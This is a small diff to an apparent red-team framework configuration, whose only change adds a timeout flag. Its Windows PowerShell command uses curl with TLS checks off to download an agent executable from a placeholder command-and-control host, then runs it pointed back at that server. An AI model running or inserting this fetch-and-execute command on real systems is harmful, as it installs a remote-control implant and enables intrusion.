@@ -12,7 +12,7 @@
     windows:
       psh:
         command: |
-          curl.exe -k -H "file: Merlino.exe" "https://MORGANA_ADDRESS/file/download" -o Merlino.exe;.\Merlino.exe -server "https://MORGANA_ADDRESS" -group "red" -sleep 5
+          curl.exe -k -H "file: Merlino.exe" "https://MORGANA_ADDRESS/file/download" -o Merlino.exe;.\Merlino.exe -server "https://MORGANA_ADDRESS" -group "red" -sleep 5 -timeout 30
     linux:
       sh:
         command: |
